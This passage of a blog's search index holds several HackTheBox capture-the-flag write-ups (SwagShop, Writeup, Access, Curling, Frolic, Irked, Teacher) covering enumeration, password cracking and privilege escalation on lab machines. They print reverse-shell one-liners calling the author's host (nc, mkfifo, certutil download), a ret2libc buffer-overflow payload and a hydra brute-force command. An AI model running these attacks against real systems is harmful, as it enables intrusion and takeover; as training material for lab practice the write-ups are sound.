5 requests in total According to exploit it searches for ajaxBlockUrl Which is returned to third request Let\u0026rsquo;s follow redirects Modify the payload We get our rce Now send payload and get reverse shell Root Let\u0026rsquo;s check sudo rights Check GTFOBins and get root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/swagshop/images/swagshop.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/swagshop/","summary":"SwagShop Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.140 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 12:50 BST Nmap scan report for 10.10.10.140 (10.10.10.140) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: SwagShop"},{"categories":null,"contents":"Writeup Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.138 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 18:03 BST Nmap scan report for 10.10.10.138 (10.10.10.138) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd5310700bd0470ae27e4ab6429823c7 (RSA) | 256 372e1468aeb9c2342b6ed992bcbfbd28 (ECDSA) |_ 256 93eaa84042c1a83385b35600621ca0ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds Web server Foothold/User The site was generated by CMS Made Simple Searchsploit We don\u0026rsquo;t know the version, but we can try exploits that cover majority of versions Post Python3 version of exploit iconv -t UTF-8 -f iso-8859-1 /usr/share/wordlists/rockyou.txt \u0026gt; rockyou-utf8.txt in case you want to crack using the script, but I suggest using hashcat python3 cms_exploit.py -u http://10.10.10.138/writeup -w rockyou-utf8.txt Let\u0026rsquo;s crack the hash ssh to box Root Enumerate for privesc Automated tasks Groups staff: Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may \u0026quot;override\u0026quot; the executables in /bin and /usr/bin with the same name). Compare with group \u0026quot;adm\u0026quot;, which is more related to monitoring/security. - according to wiki We can only exploit that only via relative path Let\u0026rsquo;s find a way to exploit that When I tried connecting again via ssh while pspy was on, we see run-parts is executed via relative path So let\u0026rsquo;s create a script Make it executable Setup listener Connect via ssh again And we have our root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/writeup/images/writeup.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/writeup/","summary":"Writeup Enumeration nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.138 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 18:03 BST Nmap scan report for 10.10.10.138 (10.10.10.138) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd5310700bd0470ae27e4ab6429823c7 (RSA) | 256 372e1468aeb9c2342b6ed992bcbfbd28 (ECDSA) |_ 256 93eaa84042c1a83385b35600621ca0ab (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Writeup"},{"categories":null,"contents":"Access Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.98 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 14:20 BST Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.094s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet Microsoft Windows XP telnetd | telnet-ntlm-info: | Target_Name: ACCESS | NetBIOS_Domain_Name: ACCESS | NetBIOS_Computer_Name: ACCESS | DNS_Domain_Name: ACCESS | DNS_Computer_Name: ACCESS |_ Product_Version: 6.1.7600 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: MegaCorp | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds Web Server Foothold/User Let\u0026rsquo;s enumerate ftp Traverse directories and download everything We see Access Control archive I tried unzipping with unzip, but had no success Using 7z was more successful, since it asked for password So now we need to look for password Let\u0026rsquo;s check backup file It\u0026rsquo;s a Microsoft Access Database We can use mdbtools sudo apt install mdbtools List the tables We see auth_-_user table Let\u0026rsquo;s dump it We can try each password to unzip the Access Control archive After unzipping we get a pst file, which is Microsoft Outlook email folder I used readpst sudo apt install pst-utils It\u0026rsquo;s a plain text file Just open it with less 'Access Control.mbox' We see an email with creds We have open telnet port Let\u0026rsquo;s connect with obtained creds Root Let\u0026rsquo;s enumerate for privesc We find a interesting lnk file It runs runas with savecred options Let\u0026rsquo;s check cmdkey for saved credentials We see that we have ACCESS\\Administrator\u0026rsquo;s credentials saved Let\u0026rsquo;s use them and get our root Download nc: certutil -urlcache -f http://10.10.16.3:8000/shell.ps1 shell.ps1 And start reverse shell: runas /user:ACCESS\\Administrator /savecred \u0026quot;nc.exe 10.10.16.3 6666 -e cmd\u0026quot; Check 0xdf\u0026rsquo;s blog for other privesc paths ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/access/images/access.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/access/","summary":"Access Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.98 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 14:20 BST Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.094s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet Microsoft Windows XP telnetd | telnet-ntlm-info: | Target_Name: ACCESS | NetBIOS_Domain_Name: ACCESS | NetBIOS_Computer_Name: ACCESS | DNS_Domain_Name: ACCESS | DNS_Computer_Name: ACCESS |_ Product_Version: 6.","tags":["HTB"],"title":"[HTB] Machine: Access"},{"categories":null,"contents":"Curling Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.150 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 17:50 BST Nmap scan report for 10.10.10.150 (10.10.10.150) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8ad169b490203ea7b65401eb68303aca (RSA) | 256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA) |_ 256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Home |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-generator: Joomla! - Open Source Content Management Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.150 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.150 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/12 18:07:47 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 14264] /media (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.150/media/] /templates (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.150/templates/] /modules (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/modules/] /.php (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.150/images/] /bin (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/bin/] /plugins (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/plugins/] /includes (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.150/includes/] /language (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.150/language/] /README.txt (Status: 200) [Size: 4872] /components (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.150/components/] /cache (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.150/cache/] /libraries (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.150/libraries/] /tmp (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/tmp/] /LICENSE.txt (Status: 200) [Size: 18092] /layouts (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/layouts/] /secret.txt (Status: 200) [Size: 17] /administrator (Status: 301) [Size: 320] [--\u0026gt; http://10.10.10.150/administrator/] /configuration.php (Status: 200) [Size: 0] /htaccess.txt (Status: 200) [Size: 3005] /cli (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/cli/] Progress: 220515 / 220561 (99.98%) =============================================================== 2023/06/12 18:16:06 Finished =============================================================== Web server Joomla And let\u0026rsquo;s find joomla version Foothold Let\u0026rsquo;s check secret.txt returned by gobuster Probably a password We see the possible username Try creds to enter the administrator page We can create a new php file and use it to launch a reverse shell Let\u0026rsquo;s create it in templates page And we get our rce Set up a listener an send your reverse shell payload We got our foothold User Let\u0026rsquo;s check floris home folder We see password_backup file Which looks like a bz2 archive I uploaded archive to my vm And converted it back to binary using xxd Then decompressed using bunzip2, which result in gzip file Repeat decompressing until we get password.txt Use password to ssh or su as floris Root Enumerate for privesc linpeas and pspy64 We see an automated process/job running The job inputs config file to curl via -K option: Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they were provided on the command line. So we can try modifying input file and read our flag Or we can add floris to sudoers by overwriting original sudoers file on the machine Create sudoers file on our box and deploy http server Modify input file to download and replace sudoers file Wait for the task and then sudo su We are root Useful: You can watch the modification of file with watch command watch -n 1 cat report ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/curling/images/curling.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/curling/","summary":"Curling Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.150 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 17:50 BST Nmap scan report for 10.10.10.150 (10.10.10.150) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8ad169b490203ea7b65401eb68303aca (RSA) | 256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA) |_ 256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Curling"},{"categories":null,"contents":"Frolic Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 16:52 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1880/tcp open vsat-control 9999/tcp open abyss Nmap done: 1 IP address (1 host up) scanned in 1037.54 seconds â””â”€$ nmap -sV -sC -p22,139,445,1880,9999 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 17:10 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 877b912a0f11b6571ecb9f77cf35e221 (RSA) | 256 b79b06ddc25e284478411e677d1eb762 (ECDSA) |_ 256 21cf166d82a430c3c69cd738bab502b0 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 1880/tcp open http Node.js (Express middleware) |_http-title: Node-RED 9999/tcp open http nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Welcome to nginx! Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h50m26s, deviation: 3h10m30s, median: -27s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-14T16:09:55 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: frolic | NetBIOS computer name: FROLIC\\x00 | Domain name: \\x00 | FQDN: frolic |_ System time: 2023-06-14T21:39:55+05:30 |_nbstat: NetBIOS name: FROLIC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.51 seconds smbmap â””â”€$ smbmap -H 10.10.10.111 [+] Guest session IP: 10.10.10.111:445 Name: 10.10.10.111 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (frolic server (Samba, Ubuntu)) â””â”€$ smbclient -N -L //10.10.10.111 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (frolic server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FROLIC gobuster port 9999 â””â”€$ gobuster dir -u http://10.10.10.111:9999 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/14 17:34:41 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/admin/] /test (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/test/] /dev (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/dev/] /backup (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/backup/] /loop (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/loop/] â””â”€$ gobuster dir -u http://10.10.10.111:9999/dev -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999/dev [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/14 17:45:50 Starting gobuster in directory enumeration mode =============================================================== /test (Status: 200) [Size: 5] /backup (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/dev/backup/] gobuster port 1880 â””â”€$ gobuster dir -u http://10.10.10.111:1880 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:1880 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2023/06/22 16:42:49 Starting gobuster in directory enumeration mode =============================================================== /icons (Status: 401) [Size: 12] /red (Status: 301) [Size: 173] [--\u0026gt; /red/] /vendor (Status: 301) [Size: 179] [--\u0026gt; /vendor/] /settings (Status: 401) [Size: 12] /Icons (Status: 401) [Size: 12] /nodes (Status: 401) [Size: 12] Web server on port 1880 Web server on port 9999 Playsms Foothold/User Open files from backup route Which doesn\u0026rsquo;t work on any login page, so let\u0026rsquo;s continue enumeration If we check admin path View page source and open login.js We see the creds Let\u0026rsquo;s use them We get a weird puzzle or encrypted message Googling quite a bit resulted in esoteric programming language called Ook! Ook! Interpreter Decoded as: Nothing here check /asdiSIAJJ0QWE9JAS Let\u0026rsquo;s navigate there More encoded text Let\u0026rsquo;s curl it and decode it Which looks like a zip file Let\u0026rsquo;s unzip it Looks like it\u0026rsquo;s protected with a password Use frackzip or john2zip with john: https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux Another encoded text Remove \\r\\n to be able to decode from base64 It\u0026rsquo;s a brainfuck Interpreter Result: idkwhatispass Entering the creds to every login page Worked for Playsms login page I didn\u0026rsquo;t find a version of the application There is a list of public exploits Let\u0026rsquo;s play with php/webapps/42044.txt https://www.exploit-db.com/exploits/42044 https://www.youtube.com/watch?v=KIB9sKQdEwE Create backdoor.csv Upload csv to Phonebook We got shell Root Let\u0026rsquo;s enumerate We find a binary called rop Owned by root with setuid Which implies binary exploitation using rop Let\u0026rsquo;s download it Let\u0026rsquo;s check if we can overwrite the EIP register Create pattern msf-pattern_create -l 200 Then run binary by inputing the pattern Check EIP register Find the offset using the value of EIP: msf-pattern_offset -q 'b7Ab' We see the offset is equal to 52 So let\u0026rsquo;s test it: python3 -c 'print(\u0026quot;A\u0026quot; * 52 + \u0026quot;BBBB\u0026quot;)' And input the result to binary and check the EIP Let\u0026rsquo;s also check ASLR cat /proc/sys/kernel/randomize_va_space Okay, ASLR is off Let\u0026rsquo;s find the addresses of system and exit, since we want to overwrite EIP, so that we force program to return/call the system But we also need to make a correct stack shape, so that the program finds the arguments ldd rop - to list dynamic dependencies of the rop binary readelf -s /lib/i386-linux-gnu/libc.so.6 | grep \u0026quot; system@\u0026quot; - display system table information about the object file and grep system readelf -s /lib/i386-linux-gnu/libc.so.6 | grep \u0026quot; exit@\u0026quot; - display system table information about the object file and grep exit strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh - get a /bin/sh strings offset in libc Now we need to calculate the addresses and craft a payload system = 0xb7e19000 + 0x0003ada0 = 0xb7e53da0 exit = 0xb7e19000 + 0x0002e9d0 = 0xb7e479d0 /bin/sh = 0xb7e19000 + 0x15ba0b = 0xb7f74a0b Payload: \u0026ldquo;A\u0026rdquo; * 52 + SYSTEM + EXIT + SHELL The image of the stack frame after we \u0026ldquo;call\u0026rdquo; system So let\u0026rsquo;s exploit python -c 'print(\u0026quot;A\u0026quot;*52 + \u0026quot;\\xa0\\x3d\\xe5\\xb7\u0026quot; + \u0026quot;\\xd0\\x79\\xe4\\xb7\u0026quot; + \u0026quot;\\x0b\\x4a\\xf7\\xb7\u0026quot;)' Supply the payload to binary And we are root ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/frolic/images/frolic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/frolic/","summary":"Frolic Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 16:52 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1880/tcp open vsat-control 9999/tcp open abyss Nmap done: 1 IP address (1 host up) scanned in 1037.54 seconds â””â”€$ nmap -sV -sC -p22,139,445,1880,9999 10.","tags":["HTB"],"title":"[HTB] Machine: Frolic"},{"categories":null,"contents":"Irked Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:23 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 6697/tcp open ircs-u 8067/tcp open infi-async 58258/tcp open unknown 65534/tcp open unknown â””â”€$ nmap -sV -sC -p22,80,111,6697,8067,58258,65534 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:51 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA) | 2048 752e66bfb93cccf77e848a8bf0810233 (RSA) | 256 c8a3a25e349ac49b9053f750bfea253b (ECDSA) |_ 256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 35649/udp6 status | 100024 1 44214/tcp6 status | 100024 1 58258/tcp status |_ 100024 1 59795/udp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 58258/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd (Admin email djmardov@irked.htb) Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds Web server Foothold We have an open irc port Let\u0026rsquo;s connect Create and edit new network: irked in screenshots below Setup connection: change newserver/6697 to 10.10.10.117/6697 We can add the network to favorites and filter everything out And finally connect Nothing interesting except the version of the software Let\u0026rsquo;s use searchsploit to search for vulnerabilities And we find a few Let\u0026rsquo;s test rce Seems like it works Let\u0026rsquo;s get our foothold payload: AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.3 6666 \u0026gt;/tmp/f User Now we need to privesc Enumerate as usual We see interesting file in /home/djmardov/Documents directory Let\u0026rsquo;s open it It certainly implies stenography and we have an image on the website Let\u0026rsquo;s check it I used steghide And we have our user Root Basic enumeration linpeas or manual sudo -l - no results search for suid binaries: find / -perm -4000 -exec ls -lha {} \\; 2\u0026gt;/dev/null Strange vievuser file We have an error that sh can\u0026rsquo;t locate /tmp/listusers Let\u0026rsquo;s create file and add whoami just in case it will execute it So, we can pretty much execute anyhing Start listener and add reverse shell payload to /tmp/listusers Rooted ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/irked/images/irked.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/irked/","summary":"Irked Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:23 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 6697/tcp open ircs-u 8067/tcp open infi-async 58258/tcp open unknown 65534/tcp open unknown â””â”€$ nmap -sV -sC -p22,80,111,6697,8067,58258,65534 10.10.10.117 Starting Nmap 7.93 ( https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Irked"},{"categories":null,"contents":"Teacher Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.153 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 16:50 BST Nmap scan report for 10.10.10.153 (10.10.10.153) Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.53 seconds gobuster â””â”€$ gobuster dir -u http://10.10.10.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.153 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,html [+] Timeout: 10s =============================================================== 2023/06/15 16:47:54 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 292] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/images/] /index.html (Status: 200) [Size: 8028] /gallery.html (Status: 200) [Size: 8254] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.153/css/] /manual (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/manual/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.153/js/] /javascript (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.153/javascript/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.153/fonts/] /phpmyadmin (Status: 403) [Size: 297] /moodle (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/moodle/] /.html (Status: 403) [Size: 292] /server-status (Status: 403) [Size: 300] Web server Checked a few interesting paths provided by gobuster Foothold I spend so much time searching for clues Checked searchploit Found a few rce exploit, but they require authentification Checked /images And found a note We have piece of the password, let\u0026rsquo;s write a script to generate all possible variations Let\u0026rsquo;s run hydra hydra -l Giovanni -P passwords.list teacher.htb http-post-form \u0026quot;/moodle/login/index.php:anchor=\u0026amp;username=^USER^\u0026amp;password=^PASS^\u0026amp;rememberusername=1:Invalid login\u0026quot; Now we can check the exploits There is a post explaining rce in moodle Now we need to follow the steps and get our rce\nLaunch a listener And perform the steps defined in the post The following screenshots contain the steps described in the post Login, turn on editing and add an activity to any topic\nSelect Quiz Fill in required fields and save Open quiz and click on edit quiz button Add a new question Select calculated Fill in required forms Add payload to Answer field Save and click next Add payload to end of url \u0026amp;0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;%261|nc 10.10.16.3 6666 \u0026gt;/tmp/f We got a foothold User Enumerate We can run linpeas I started with basic enumeration sudo -l with no success find / -perm -4000 -exec ls -lha {} \\; 2\u0026gt;/dev/null no success ps -ef showed that we have a mysql running Let\u0026rsquo;s check the /var/www/html/moodle folder Search for db configuration file We found config.php Open it and use the creds stored to connect to mysql mysql -u root -p Found creds stored in moodle db and mdl_user table Checked hash in Crackstation su to giovanni Root Enumerate again pspy and linpeas Let\u0026rsquo;s open the script We have few variants Change permissions using symbolic links ln -s since for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file So we can create links to /etc/passwd -\u0026gt; modify it by adding root user /etc/shadow -\u0026gt; modify it by adding root user or crack root hash /usr/bin/backup.sh -\u0026gt; append reverse shell payload I prefered the last option Setup listener and wait for connection Rooted ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/teacher/images/teacher.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/teacher/","summary":"Teacher Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.153 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 16:50 BST Nmap scan report for 10.10.10.153 (10.10.10.153) Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host 